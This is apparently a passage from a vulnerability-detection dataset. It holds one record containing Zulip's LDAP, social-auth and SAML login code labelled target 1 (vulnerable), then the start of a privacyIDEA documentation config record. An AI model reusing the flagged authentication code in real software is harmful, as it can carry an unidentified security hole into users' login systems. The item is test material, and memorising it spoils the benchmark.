(1) whether the\n        email address for this user obtained from LDAP has an active\n        account in this Zulip realm.  If so, it will log them in.\n\n        Otherwise, to provide a seamless Single Sign-On experience\n        with LDAP, this function can automatically create a new Zulip\n        user account in the realm (assuming the realm is configured to\n        allow that email address to sign up).\n        \"\"\"\n        return_data = {}  # type: Dict[str, Any]\n\n        username = self.user_email_from_ldapuser(username, ldap_user)\n\n        if 'userAccountControl' in settings.AUTH_LDAP_USER_ATTR_MAP:  # nocoverage\n            ldap_disabled = self.is_account_control_disabled_user(ldap_user)\n            if ldap_disabled:\n                # Treat disabled users as deactivated in Zulip.\n                return_data[\"inactive_user\"] = True\n                raise ZulipLDAPException(\"User has been deactivated\")\n\n        user_profile = common_get_active_user(username, self._realm, return_data)\n        if user_profile is not None:\n            # An existing user, successfully authed; return it.\n            return user_profile, False\n\n        if return_data.get(\"inactive_realm\"):\n            # This happens if there is a user account in a deactivated realm\n            raise ZulipLDAPException(\"Realm has been deactivated\")\n        if return_data.get(\"inactive_user\"):\n            raise ZulipLDAPException(\"User has been deactivated\")\n        # An invalid_subdomain `return_data` value here is ignored,\n        # since that just means we're trying to create an account in a\n        # second realm on the server (`ldap_auth_enabled(realm)` would\n        # have been false if this user wasn't meant to have an account\n        # in this second realm).\n        if self._realm.deactivated:\n            # This happens if no account exists, but the realm is\n            # deactivated, so we shouldn't create a new user account\n            raise ZulipLDAPException(\"Realm has been deactivated\")\n\n        # Makes sure that email domain hasn't be restricted for this\n        # realm.  The main thing here is email_allowed_for_realm; but\n        # we also call validate_email_for_realm just for consistency,\n        # even though its checks were already done above.\n        try:\n            email_allowed_for_realm(username, self._realm)\n            validate_email_for_realm(self._realm, username)\n        except DomainNotAllowedForRealmError:\n            raise ZulipLDAPException(\"This email domain isn't allowed in this organization.\")\n        except (DisposableEmailError, EmailContainsPlusError):\n            raise ZulipLDAPException(\"Email validation failed.\")\n\n        # We have valid LDAP credentials; time to create an account.\n        full_name, short_name = self.get_mapped_name(ldap_user)\n        try:\n            full_name = check_full_name(full_name)\n        except JsonableError as e:\n            raise ZulipLDAPException(e.msg)\n\n        opts = {}   # type: Dict[str, Any]\n        if self._prereg_user:\n            invited_as = self._prereg_user.invited_as\n            realm_creation = self._prereg_user.realm_creation\n            opts['prereg_user'] = self._prereg_user\n            opts['is_realm_admin'] = (\n                invited_as == PreregistrationUser.INVITE_AS['REALM_ADMIN']) or realm_creation\n            opts['is_guest'] = invited_as == PreregistrationUser.INVITE_AS['GUEST_USER']\n            opts['realm_creation'] = realm_creation\n            opts['default_stream_groups'] = get_default_stream_groups(self._realm)\n\n        user_profile = do_create_user(username, None, self._realm, full_name, short_name, **opts)\n        self.sync_avatar_from_ldap(user_profile, ldap_user)\n        self.sync_custom_profile_fields_from_ldap(user_profile, ldap_user)\n\n        return user_profile, True\n\nclass ZulipLDAPUserPopulator(ZulipLDAPAuthBackendBase):\n    \"\"\"Just like ZulipLDAPAuthBackend, but doesn't let you log in.  Used\n    for syncing data like names, avatars, and custom profile fields\n    from LDAP in `manage.py sync_ldap_user_data` as well as in\n    registration for organizations that use a different SSO solution\n    for managing login (often via RemoteUserBackend).\n    \"\"\"\n    def authenticate(self, *, username: str, password: str, realm: Realm,\n                     return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n        return None\n\n    def get_or_build_user(self, username: str,\n                          ldap_user: _LDAPUser) -> Tuple[UserProfile, bool]:\n        \"\"\"This is used only in non-authentication contexts such as:\n             ./manage.py sync_ldap_user_data\n        \"\"\"\n        # Obtain the django username from the ldap_user object:\n        username = self.user_email_from_ldapuser(username, ldap_user)\n\n        # Call the library get_or_build_user for building the UserProfile\n        # with the username we obtained:\n        (user, built) = super().get_or_build_user(username, ldap_user)\n        # Synchronise the UserProfile with its LDAP attributes:\n        if 'userAccountControl' in settings.AUTH_LDAP_USER_ATTR_MAP:\n            user_disabled_in_ldap = self.is_account_control_disabled_user(ldap_user)\n            if user_disabled_in_ldap:\n                if user.is_active:\n                    logging.info(\"Deactivating user %s because they are disabled in LDAP.\" %\n                                 (user.email,))\n                    do_deactivate_user(user)\n                # Do an early return to avoid trying to sync additional data.\n                return (user, built)\n            elif not user.is_active:\n                logging.info(\"Reactivating user %s because they are not disabled in LDAP.\" %\n                             (user.email,))\n                do_reactivate_user(user)\n\n        self.sync_avatar_from_ldap(user, ldap_user)\n        self.sync_full_name_from_ldap(user, ldap_user)\n        self.sync_custom_profile_fields_from_ldap(user, ldap_user)\n        return (user, built)\n\nclass PopulateUserLDAPError(ZulipLDAPException):\n    pass\n\n@receiver(ldap_error, sender=ZulipLDAPUserPopulator)\ndef catch_ldap_error(signal: Signal, **kwargs: Any) -> None:\n    \"\"\"\n    Inside django_auth_ldap populate_user(), if LDAPError is raised,\n    e.g. due to invalid connection credentials, the function catches it\n    and emits a signal (ldap_error) to communicate this error to others.\n    We normally don't use signals, but here there's no choice, so in this function\n    we essentially convert the signal to a normal exception that will properly\n    propagate out of django_auth_ldap internals.\n    \"\"\"\n    if kwargs['context'] == 'populate_user':\n        # The exception message can contain the password (if it was invalid),\n        # so it seems better not to log that, and only use the original exception's name here.\n        raise PopulateUserLDAPError(kwargs['exception'].__class__.__name__)\n\ndef sync_user_from_ldap(user_profile: UserProfile, logger: logging.Logger) -> bool:\n    backend = ZulipLDAPUserPopulator()\n    try:\n        ldap_username = backend.django_to_ldap_username(user_profile.email)\n    except ZulipLDAPExceptionNoMatchingLDAPUser:\n        if settings.LDAP_DEACTIVATE_NON_MATCHING_USERS:\n            do_deactivate_user(user_profile)\n            logger.info(\"Deactivated non-matching user: %s\" % (user_profile.email,))\n            return True\n        elif user_profile.is_active:\n            logger.warning(\"Did not find %s in LDAP.\" % (user_profile.email,))\n        return False\n\n    updated_user = backend.populate_user(ldap_username)\n    if updated_user:\n        logger.info(\"Updated %s.\" % (user_profile.email,))\n        return True\n\n    raise PopulateUserLDAPError(\"populate_user unexpectedly returned {}\".format(updated_user))\n\n# Quick tool to test whether you're correctly authenticating to LDAP\ndef query_ldap(email: str) -> List[str]:\n    values = []\n    backend = next((backend for backend in get_backends() if isinstance(backend, LDAPBackend)), None)\n    if backend is not None:\n        try:\n            ldap_username = backend.django_to_ldap_username(email)\n        except ZulipLDAPExceptionNoMatchingLDAPUser:\n            values.append(\"No such user found\")\n            return values\n\n        ldap_attrs = _LDAPUser(backend, ldap_username).attrs\n\n        for django_field, ldap_field in settings.AUTH_LDAP_USER_ATTR_MAP.items():\n            value = ldap_attrs.get(ldap_field, [\"LDAP field not present\", ])[0]\n            if django_field == \"avatar\":\n                if isinstance(value, bytes):\n                    value = \"(An avatar image file)\"\n            values.append(\"%s: %s\" % (django_field, value))\n        if settings.LDAP_EMAIL_ATTR is not None:\n            values.append(\"%s: %s\" % ('email', ldap_attrs[settings.LDAP_EMAIL_ATTR][0]))\n    else:\n        values.append(\"LDAP backend not configured on this server.\")\n    return values\n\nclass DevAuthBackend(ZulipAuthMixin):\n    \"\"\"Allow logging in as any user without a password.  This is used for\n    convenience when developing Zulip, and is disabled in production.\"\"\"\n    def authenticate(self, *, dev_auth_username: str, realm: Realm,\n                     return_data: Optional[Dict[str, Any]]=None) -> Optional[UserProfile]:\n        if not dev_auth_enabled(realm):\n            return None\n        return common_get_active_user(dev_auth_username, realm, return_data=return_data)\n\ndef redirect_deactivated_user_to_login() -> HttpResponseRedirect:\n    # Specifying the template name makes sure that the user is not redirected to dev_login in case of\n    # a deactivated account on a test server.\n    login_url = reverse('zerver.views.auth.login_page', kwargs = {'template_name': 'zerver/login.html'})\n    redirect_url = login_url + '?is_deactivated=true'\n    return HttpResponseRedirect(redirect_url)\n\ndef social_associate_user_helper(backend: BaseAuth, return_data: Dict[str, Any],\n                                 *args: Any, **kwargs: Any) -> Optional[UserProfile]:\n    \"\"\"Responsible for doing the Zulip-account lookup and validation parts\n    of the Zulip Social auth pipeline (similar to the authenticate()\n    methods in most other auth backends in this file).\n\n    Returns a UserProfile object for successful authentication, and None otherwise.\n    \"\"\"\n    subdomain = backend.strategy.session_get('subdomain')\n    try:\n        realm = get_realm(subdomain)\n    except Realm.DoesNotExist:\n        return_data[\"invalid_realm\"] = True\n        return None\n    return_data[\"realm_id\"] = realm.id\n\n    if not auth_enabled_helper([backend.auth_backend_name], realm):\n        return_data[\"auth_backend_disabled\"] = True\n        return None\n\n    if 'auth_failed_reason' in kwargs.get('response', {}):\n        return_data[\"social_auth_failed_reason\"] = kwargs['response'][\"auth_failed_reason\"]\n        return None\n    elif hasattr(backend, 'get_verified_emails'):\n        # Some social backends, like GitHubAuthBackend, don't\n        # guarantee that the `details` data is validated (i.e., it's\n        # possible users can put any string they want in the \"email\"\n        # field of the `details` object).  For those backends, we have\n        # custom per-backend code to properly fetch only verified\n        # email addresses from the appropriate third-party API.\n        verified_emails = backend.get_verified_emails(*args, **kwargs)\n        verified_emails_length = len(verified_emails)\n        if verified_emails_length == 0:\n            # TODO: Provide a nice error message screen to the user\n            # for this case, rather than just logging a warning.\n            logging.warning(\"Social auth (%s) failed because user has no verified emails\" %\n                            (backend.auth_backend_name,))\n            return_data[\"email_not_verified\"] = True\n            return None\n\n        if verified_emails_length == 1:\n            chosen_email = verified_emails[0]\n        else:\n            chosen_email = backend.strategy.request_data().get('email')\n\n        if not chosen_email:\n            avatars = {}  # Dict[str, str]\n            for email in verified_emails:\n                existing_account = common_get_active_user(email, realm, {})\n                if existing_account is not None:\n                    avatars[email] = avatar_url(existing_account)\n\n            return render(backend.strategy.request, 'zerver/social_auth_select_email.html', context = {\n                'primary_email': verified_emails[0],\n                'verified_non_primary_emails': verified_emails[1:],\n                'backend': 'github',\n                'avatar_urls': avatars,\n            })\n\n        try:\n            validate_email(chosen_email)\n        except ValidationError:\n            return_data['invalid_email'] = True\n            return None\n\n        if chosen_email not in verified_emails:\n            # If a user edits the submit value for the choose email form, we might\n            # end up with a wrong email associated with the account. The below code\n            # takes care of that.\n            logging.warning(\"Social auth (%s) failed because user has no verified\"\n                            \" emails associated with the account\" %\n                            (backend.auth_backend_name,))\n            return_data[\"email_not_associated\"] = True\n            return None\n\n        validated_email = chosen_email\n    else:\n        try:\n            validate_email(kwargs[\"details\"].get(\"email\"))\n        except ValidationError:\n            return_data['invalid_email'] = True\n            return None\n        validated_email = kwargs[\"details\"].get(\"email\")\n\n    if not validated_email:  # nocoverage\n        # This code path isn't used with GitHubAuthBackend, but may be relevant for other\n        # social auth backends.\n        return_data['invalid_email'] = True\n        return None\n\n    return_data[\"valid_attestation\"] = True\n    return_data['validated_email'] = validated_email\n    user_profile = common_get_active_user(validated_email, realm, return_data)\n\n    full_name = kwargs['details'].get('fullname')\n    first_name = kwargs['details'].get('first_name', '')\n    last_name = kwargs['details'].get('last_name', '')\n    if full_name is None:\n        if not first_name and not last_name:\n            # If we add support for any of the social auth backends that\n            # don't provide this feature, we'll need to add code here.\n            raise AssertionError(\"Social auth backend doesn't provide name\")\n\n    if full_name:\n        return_data[\"full_name\"] = full_name\n    else:\n        # In SAML authentication, the IdP may support only sending\n        # the first and last name as separate attributes - in that case\n        # we construct the full name from them.\n        return_data[\"full_name\"] = \"{} {}\".format(\n            first_name,\n            last_name\n        ).strip()  # strip removes the unnecessary ' '\n\n    return user_profile\n\n@partial\ndef social_auth_associate_user(\n        backend: BaseAuth,\n        *args: Any,\n        **kwargs: Any) -> Union[HttpResponse, Dict[str, Any]]:\n    \"\"\"A simple wrapper function to reformat the return data from\n    social_associate_user_helper as a dictionary.  The\n    python-social-auth infrastructure will then pass those values into\n    later stages of settings.SOCIAL_AUTH_PIPELINE, such as\n    social_auth_finish, as kwargs.\n    \"\"\"\n    partial_token = backend.strategy.request_data().get('partial_token')\n    return_data = {}  # type: Dict[str, Any]\n    user_profile = social_associate_user_helper(\n        backend, return_data, *args, **kwargs)\n\n    if type(user_profile) == HttpResponse:\n        return user_profile\n    else:\n        return {'user_profile': user_profile,\n                'return_data': return_data,\n                'partial_token': partial_token,\n                'partial_backend_name': backend}\n\ndef social_auth_finish(backend: Any,\n                       details: Dict[str, Any],\n                       response: HttpResponse,\n                       *args: Any,\n                       **kwargs: Any) -> Optional[UserProfile]:\n    \"\"\"Given the determination in social_auth_associate_user for whether\n    the user should be authenticated, this takes care of actually\n    logging in the user (if appropriate) and redirecting the browser\n    to the appropriate next page depending on the situation.  Read the\n    comments below as well as login_or_register_remote_user in\n    `zerver/views/auth.py` for the details on how that dispatch works.\n    \"\"\"\n    from zerver.views.auth import (login_or_register_remote_user,\n                                   redirect_and_log_into_subdomain)\n\n    user_profile = kwargs['user_profile']\n    return_data = kwargs['return_data']\n\n    no_verified_email = return_data.get(\"email_not_verified\")\n    auth_backend_disabled = return_data.get('auth_backend_disabled')\n    inactive_user = return_data.get('inactive_user')\n    inactive_realm = return_data.get('inactive_realm')\n    invalid_realm = return_data.get('invalid_realm')\n    invalid_email = return_data.get('invalid_email')\n    auth_failed_reason = return_data.get(\"social_auth_failed_reason\")\n    email_not_associated = return_data.get(\"email_not_associated\")\n\n    if invalid_realm:\n        from zerver.views.auth import redirect_to_subdomain_login_url\n        return redirect_to_subdomain_login_url()\n\n    if inactive_user:\n        return redirect_deactivated_user_to_login()\n\n    if auth_backend_disabled or inactive_realm or no_verified_email or email_not_associated:\n        # Redirect to login page. We can't send to registration\n        # workflow with these errors. We will redirect to login page.\n        return None\n\n    if invalid_email:\n        # In case of invalid email, we will end up on registration page.\n        # This seems better than redirecting to login page.\n        logging.warning(\n            \"{} got invalid email argument.\".format(backend.auth_backend_name)\n        )\n        return None\n\n    if auth_failed_reason:\n        logging.info(auth_failed_reason)\n        return None\n\n    # Structurally, all the cases where we don't have an authenticated\n    # email for the user should be handled above; this assertion helps\n    # prevent any violations of that contract from resulting in a user\n    # being incorrectly authenticated.\n    assert return_data.get('valid_attestation') is True\n\n    strategy = backend.strategy\n    full_name_validated = backend.full_name_validated\n    email_address = return_data['validated_email']\n    full_name = return_data['full_name']\n    is_signup = strategy.session_get('is_signup') == '1'\n    redirect_to = strategy.session_get('next')\n    realm = Realm.objects.get(id=return_data[\"realm_id\"])\n    multiuse_object_key = strategy.session_get('multiuse_object_key', '')\n    mobile_flow_otp = strategy.session_get('mobile_flow_otp')\n\n    # At this point, we have now confirmed that the user has\n    # demonstrated control over the target email address.\n    #\n    # The next step is to call login_or_register_remote_user, but\n    # there are two code paths here because of an optimization to save\n    # a redirect on mobile.\n\n    if mobile_flow_otp is not None:\n        # For mobile app authentication, login_or_register_remote_user\n        # will redirect to a special zulip:// URL that is handled by\n        # the app after a successful authentication; so we can\n        # redirect directly from here, saving a round trip over what\n        # we need to do to create session cookies on the right domain\n        # in the web login flow (below).\n        return login_or_register_remote_user(\n            strategy.request, email_address,\n            user_profile, full_name,\n            mobile_flow_otp=mobile_flow_otp,\n            is_signup=is_signup,\n            redirect_to=redirect_to,\n            full_name_validated=full_name_validated\n        )\n\n    # If this authentication code were executing on\n    # subdomain.zulip.example.com, we would just call\n    # login_or_register_remote_user as in the mobile code path.\n    # However, because third-party SSO providers generally don't allow\n    # wildcard addresses in their redirect URLs, for multi-realm\n    # servers, we will have just completed authentication on e.g.\n    # auth.zulip.example.com (depending on\n    # settings.SOCIAL_AUTH_SUBDOMAIN), which cannot store cookies on\n    # the subdomain.zulip.example.com domain.  So instead we serve a\n    # redirect (encoding the authentication result data in a\n    # cryptographically signed token) to a route on\n    # subdomain.zulip.example.com that will verify the signature and\n    # then call login_or_register_remote_user.\n    return redirect_and_log_into_subdomain(\n        realm, full_name, email_address,\n        is_signup=is_signup,\n        redirect_to=redirect_to,\n        multiuse_object_key=multiuse_object_key,\n        full_name_validated=full_name_validated\n    )\n\nclass SocialAuthMixin(ZulipAuthMixin):\n    auth_backend_name = \"undeclared\"\n    name = \"undeclared\"\n    display_icon = None  # type: Optional[str]\n\n    # Used to determine how to order buttons on login form, backend with\n    # higher sort order are displayed first.\n    sort_order = 0\n\n    # Whether we expect that the full_name value obtained by the\n    # social backend is definitely how the user should be referred to\n    # in Zulip, which in turn determines whether we should always show\n    # a registration form in the event with a default value of the\n    # user's name when using this social backend so they can change\n    # it.  For social backends like SAML that are expected to be a\n    # central database, this should be True; for backends like GitHub\n    # where the user might not have a name set or have it set to\n    # something other than the name they will prefer to use in Zulip,\n    # it should be False.\n    full_name_validated = False\n\n    def auth_complete(self, *args: Any, **kwargs: Any) -> Optional[HttpResponse]:\n        \"\"\"This is a small wrapper around the core `auth_complete` method of\n        python-social-auth, designed primarily to prevent 500s for\n        exceptions in the social auth code from situations that are\n        really user errors.  Returning `None` from this function will\n        redirect the browser to the login page.\n        \"\"\"\n        try:\n            # Call the auth_complete method of social_core.backends.oauth.BaseOAuth2\n            return super().auth_complete(*args, **kwargs)  # type: ignore # monkey-patching\n        except AuthFailed as e:\n            # When a user's social authentication fails (e.g. because\n            # they did something funny with reloading in the middle of\n            # the flow), don't throw a 500, just send them back to the\n            # login page and record the event at the info log level.\n            logging.info(str(e))\n            return None\n        except SocialAuthBaseException as e:\n            # Other python-social-auth exceptions are likely\n            # interesting enough that we should log a warning.\n            logging.warning(str(e))\n            return None\n\nclass GitHubAuthBackend(SocialAuthMixin, GithubOAuth2):\n    name = \"github\"\n    auth_backend_name = \"GitHub\"\n    sort_order = 100\n    display_icon = \"/static/images/landing-page/logos/github-icon.png\"\n\n    def get_verified_emails(self, *args: Any, **kwargs: Any) -> List[str]:\n        access_token = kwargs[\"response\"][\"access_token\"]\n        try:\n            emails = self._user_data(access_token, '/emails')\n        except (HTTPError, ValueError, TypeError):  # nocoverage\n            # We don't really need an explicit test for this code\n            # path, since the outcome will be the same as any other\n            # case without any verified emails\n            emails = []\n\n        verified_emails = []  # type: List[str]\n        for email_obj in self.filter_usable_emails(emails):\n            # social_associate_user_helper assumes that the first email in\n            # verified_emails is primary.\n            if email_obj.get(\"primary\"):\n                verified_emails.insert(0, email_obj[\"email\"])\n            else:\n                verified_emails.append(email_obj[\"email\"])\n\n        return verified_emails\n\n    def filter_usable_emails(self, emails: List[Dict[str, Any]]) -> List[Dict[str, Any]]:\n        # We only let users login using email addresses that are\n        # verified by GitHub, because the whole point is for the user\n        # to demonstrate that they control the target email address.\n        # We also disallow the\n        # @noreply.github.com/@users.noreply.github.com email\n        # addresses, because structurally, we only want to allow email\n        # addresses that can receive emails, and those cannot.\n        return [\n            email for email in emails\n            if email.get('verified') and not email[\"email\"].endswith(\"noreply.github.com\")\n        ]\n\n    def user_data(self, access_token: str, *args: Any, **kwargs: Any) -> Dict[str, str]:\n        \"\"\"This patched user_data function lets us combine together the 3\n        social auth backends into a single Zulip backend for GitHub Oauth2\"\"\"\n        team_id = settings.SOCIAL_AUTH_GITHUB_TEAM_ID\n        org_name = settings.SOCIAL_AUTH_GITHUB_ORG_NAME\n\n        if team_id is None and org_name is None:\n            # I believe this can't raise AuthFailed, so we don't try to catch it here.\n            return super().user_data(\n                access_token, *args, **kwargs\n            )\n        elif team_id is not None:\n            backend = GithubTeamOAuth2(self.strategy, self.redirect_uri)\n            try:\n                return backend.user_data(access_token, *args, **kwargs)\n            except AuthFailed:\n                return dict(auth_failed_reason=\"GitHub user is not member of required team\")\n        elif org_name is not None:\n            backend = GithubOrganizationOAuth2(self.strategy, self.redirect_uri)\n            try:\n                return backend.user_data(access_token, *args, **kwargs)\n            except AuthFailed:\n                return dict(auth_failed_reason=\"GitHub user is not member of required organization\")\n\n        raise AssertionError(\"Invalid configuration\")\n\nclass AzureADAuthBackend(SocialAuthMixin, AzureADOAuth2):\n    sort_order = 50\n    name = \"azuread-oauth2\"\n    auth_backend_name = \"AzureAD\"\n    display_icon = \"/static/images/landing-page/logos/azuread-icon.png\"\n\nclass GoogleAuthBackend(SocialAuthMixin, GoogleOAuth2):\n    sort_order = 150\n    auth_backend_name = \"Google\"\n    name = \"google\"\n    display_icon = \"/static/images/landing-page/logos/googl_e-icon.png\"\n\n    def get_verified_emails(self, *args: Any, **kwargs: Any) -> List[str]:\n        verified_emails = []    # type: List[str]\n        details = kwargs[\"response\"]\n        email_verified = details.get(\"email_verified\")\n        if email_verified:\n            verified_emails.append(details[\"email\"])\n        return verified_emails\n\nclass SAMLAuthBackend(SocialAuthMixin, SAMLAuth):\n    auth_backend_name = \"SAML\"\n    standard_relay_params = [\"subdomain\", \"multiuse_object_key\", \"mobile_flow_otp\",\n                             \"next\", \"is_signup\"]\n    REDIS_EXPIRATION_SECONDS = 60 * 15\n    name = \"saml\"\n    # Organization which go through the trouble of setting up SAML are most likely\n    # to have it as their main authentication method, so it seems appropriate to have\n    # SAML buttons at the top.\n    sort_order = 9999\n    # There's no common default logo for SAML authentication.\n    display_icon = None\n\n    # The full_name provided by the IdP is very likely the standard\n    # employee directory name for the user, and thus what they and\n    # their organization want to use in Zulip.  So don't unnecessarily\n    # provide a registration flow prompt for them to set their name.\n    full_name_validated = True\n\n    def auth_url(self) -> str:\n        \"\"\"Get the URL to which we must redirect in order to\n        authenticate the user. Overriding the original SAMLAuth.auth_url.\n        Runs when someone accesses the /login/saml/ endpoint.\"\"\"\n        try:\n            idp_name = self.strategy.request_data()['idp']\n            auth = self._create_saml_auth(idp=self.get_idp(idp_name))\n        except KeyError:\n            # If the above raise KeyError, it means invalid or no idp was specified,\n            # we should log that and redirect to the login page.\n            logging.info(\"/login/saml/ : Bad idp param.\")\n            return reverse('zerver.views.auth.login_page',\n                           kwargs = {'template_name': 'zerver/login.html'})\n\n        # This where we change things.  We need to pass some params\n        # (`mobile_flow_otp`, `next`, etc.) through RelayState, which\n        # then the IdP will pass back to us so we can read those\n        # parameters in the final part of the authentication flow, at\n        # the /complete/saml/ endpoint.\n        #\n        # To protect against network eavesdropping of these\n        # parameters, we send just a random token to the IdP in\n        # RelayState, which is used as a key into our redis data store\n        # for fetching the actual parameters after the IdP has\n        # returned a successful authentication.\n        params_to_relay = [\"idp\"] + self.standard_relay_params\n        request_data = self.strategy.request_data().dict()\n        data_to_relay = {\n            key: request_data[key] for key in params_to_relay if key in request_data\n        }\n        relay_state = self.put_data_in_redis(data_to_relay)\n\n        return auth.login(return_to=relay_state)\n\n    @classmethod\n    def put_data_in_redis(cls, data_to_relay: Dict[str, Any]) -> str:\n        with redis_client.pipeline() as pipeline:\n            token = generate_random_token(64)\n            key = \"saml_token_{}\".format(token)\n            pipeline.set(key, ujson.dumps(data_to_relay))\n            pipeline.expire(key, cls.REDIS_EXPIRATION_SECONDS)\n            pipeline.execute()\n\n        return key\n\n    @classmethod\n    def get_data_from_redis(cls, key: str) -> Optional[Dict[str, Any]]:\n        redis_data = None\n        if key.startswith('saml_token_'):\n            # Safety if statement, to not allow someone to poke around arbitrary redis keys here.\n            redis_data = redis_client.get(key)\n        if redis_data is None:\n            # TODO: We will need some sort of user-facing message\n            # about the authentication session having expired here.\n            logging.info(\"SAML authentication failed: bad RelayState token.\")\n            return None\n\n        return ujson.loads(redis_data)\n\n    def auth_complete(self, *args: Any, **kwargs: Any) -> Optional[HttpResponse]:\n        \"\"\"\n        Additional ugly wrapping on top of auth_complete in SocialAuthMixin.\n        We handle two things here:\n            1. Working around bad RelayState or SAMLResponse parameters in the request.\n            Both parameters should be present if the user came to /complete/saml/ through\n            the IdP as intended. The errors can happen if someone simply types the endpoint into\n            their browsers, or generally tries messing with it in some ways.\n\n            2. The first part of our SAML authentication flow will encode important parameters\n            into the RelayState. We need to read them and set those values in the session,\n            and then change the RelayState param to the idp_name, because that's what\n            SAMLAuth.auth_complete() expects.\n        \"\"\"\n        if 'RelayState' not in self.strategy.request_data():\n            logging.info(\"SAML authentication failed: missing RelayState.\")\n            return None\n\n        # Set the relevant params that we transported in the RelayState:\n        redis_key = self.strategy.request_data()['RelayState']\n        relayed_params = self.get_data_from_redis(redis_key)\n        if relayed_params is None:\n            return None\n\n        result = None\n        try:\n            for param, value in relayed_params.items():\n                if param in self.standard_relay_params:\n                    self.strategy.session_set(param, value)\n\n            # super().auth_complete expects to have RelayState set to the idp_name,\n            # so we need to replace this param.\n            post_params = self.strategy.request.POST.copy()\n            post_params['RelayState'] = relayed_params[\"idp\"]\n            self.strategy.request.POST = post_params\n\n            # Call the auth_complete method of SocialAuthMixIn\n            result = super().auth_complete(*args, **kwargs)  # type: ignore # monkey-patching\n        except OneLogin_Saml2_Error as e:\n            # This will be raised if SAMLResponse is missing.\n            logging.info(str(e))\n            # Fall through to returning None.\n        finally:\n            if result is None:\n                for param in self.standard_relay_params:\n                    # If an attacker managed to eavesdrop on the RelayState token,\n                    # they may pass it here to the endpoint with an invalid SAMLResponse.\n                    # We remove these potentially sensitive parameters that we have set in the session\n                    # ealier, to avoid leaking their values.\n                    self.strategy.session_set(param, None)\n\n        return result\n\n    @classmethod\n    def check_config(cls) -> Optional[HttpResponse]:\n        obligatory_saml_settings_list = [\n            settings.SOCIAL_AUTH_SAML_SP_ENTITY_ID,\n            settings.SOCIAL_AUTH_SAML_ORG_INFO,\n            settings.SOCIAL_AUTH_SAML_TECHNICAL_CONTACT,\n            settings.SOCIAL_AUTH_SAML_SUPPORT_CONTACT,\n            settings.SOCIAL_AUTH_SAML_ENABLED_IDPS\n        ]\n        if any(not setting for setting in obligatory_saml_settings_list):\n            return redirect_to_config_error(\"saml\")\n\n        return None\n\nSocialBackendDictT = TypedDict('SocialBackendDictT', {\n    'name': str,\n    'display_name': str,\n    'display_icon': Optional[str],\n    'login_url': str,\n    'signup_url': str,\n})\n\ndef create_standard_social_backend_dict(social_backend: SocialAuthMixin) -> SocialBackendDictT:\n    return dict(\n        name=social_backend.name,\n        display_name=social_backend.auth_backend_name,\n        display_icon=social_backend.display_icon,\n        login_url=reverse('login-social', args=(social_backend.name,)),\n        signup_url=reverse('signup-social', args=(social_backend.name,)),\n    )\n\ndef list_saml_backend_dicts(realm: Optional[Realm]=None) -> List[SocialBackendDictT]:\n    result = []  # type: List[SocialBackendDictT]\n    for idp_name, idp_dict in settings.SOCIAL_AUTH_SAML_ENABLED_IDPS.items():\n        saml_dict = dict(\n            name='saml:{}'.format(idp_name),\n            display_name=idp_dict.get('display_name', SAMLAuthBackend.auth_backend_name),\n            display_icon=idp_dict.get('display_icon', SAMLAuthBackend.display_icon),\n            login_url=reverse('login-social-extra-arg', args=('saml', idp_name)),\n            signup_url=reverse('signup-social-extra-arg', args=('saml', idp_name)),\n        )  # type: SocialBackendDictT\n        result.append(saml_dict)\n\n    return result\n\ndef get_social_backend_dicts(realm: Optional[Realm]=None) -> List[SocialBackendDictT]:\n    \"\"\"\n    Returns a list of dictionaries that represent social backends, sorted\n    in the order in which they should be displayed.\n    \"\"\"\n    result = []\n    for backend in SOCIAL_AUTH_BACKENDS:\n        # SOCIAL_AUTH_BACKENDS is already sorted in the correct order,\n        # so we don't need to worry about sorting here.\n        if auth_enabled_helper([backend.auth_backend_name], realm):\n            if backend != SAMLAuthBackend:\n                result.append(create_standard_social_backend_dict(backend))\n            else:\n                result += list_saml_backend_dicts(realm)\n\n    return result\n\nAUTH_BACKEND_NAME_MAP = {\n    'Dev': DevAuthBackend,\n    'Email': EmailAuthBackend,\n    'LDAP': ZulipLDAPAuthBackend,\n    'RemoteUser': ZulipRemoteUserBackend,\n}  # type: Dict[str, Any]\nSOCIAL_AUTH_BACKENDS = []  # type: List[BaseOAuth2]\n\n# Authomatically add all of our social auth backends to relevant data structures.\nfor social_auth_subclass in SocialAuthMixin.__subclasses__():\n    AUTH_BACKEND_NAME_MAP[social_auth_subclass.auth_backend_name] = social_auth_subclass\n    SOCIAL_AUTH_BACKENDS.append(social_auth_subclass)\n\nSOCIAL_AUTH_BACKENDS = sorted(SOCIAL_AUTH_BACKENDS, key=lambda x: x.sort_order, reverse=True)\n\n# Provide this alternative name for backwards compatibility with\n# installations that had the old backend enabled.\nGoogleMobileOauth2Backend = GoogleAuthBackend\n", "target": 1}
{"idx": 1021, "func": "# -*- coding: utf-8 -*-\n#\n# privacyIDEA documentation build configuration file, created by\n# sphinx-quickstart on Fri Jun 13 07:31:01 2014.\n#\n# This file is execfile()d with the current directory set to its containing dir.\n#\n# Note that not all possible configuration values are present in this\n# autogenerated file.\n#\n# All configuration values have a default; values that are commented out\n# serve to show the default.\n\n\n# The version info for the project you're documenting, acts as replacement for\n# |version| and |release|, also used in various other places throughout the\n# built documents.\n#\n# The short X.Y version.\nversion = '2.23.1'\n# The full version, including alpha/beta/rc tags.\n#release = '2.16dev5'\nrelease = version\n\n\nimport sys\nimport os\nfrom mock import Mock as MagicMock\n\nclass Mock(MagicMock):\n    @classmethod\n    def __getattr__(cls, name):\n            return MagicMock()\n\n#MOCK_MODULES = ['pandas', 'pyOpenSSL']\nMOCK_MODULES = []\nsys.modules.update((mod_name, Mock()) for mod_name in MOCK_MODULES)\n\n\n# Monkey-patch functools.wraps\n# http://stackoverflow.com/questions/28366818/preserve-default-arguments-of-wrapped-decorated-python-function-in-sphinx-docume\nimport functools\n\ndef no_op_wraps(func):\n    \"\"\"Replaces functools.wraps in order to undo wrapping.\n\n    Can be used to preserve the decorated function's signature\n    in the documentation generated by Sphinx.\n\n    \"\"\"\n    def wrapper(decorator):\n        return func\n    return wrapper\n\nfunctools.wraps = no_op_wraps\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('..'))\nsys.path.append(os.path.abspath('_themes/flask-sphinx-themes'))\nsys.path.insert(0, os.path.abspath('../privacyidea'))\n\n# -- General configuration -----------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n#needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be extensions\n# coming with Sphinx (named 'sphinx.ext.*') or your custom 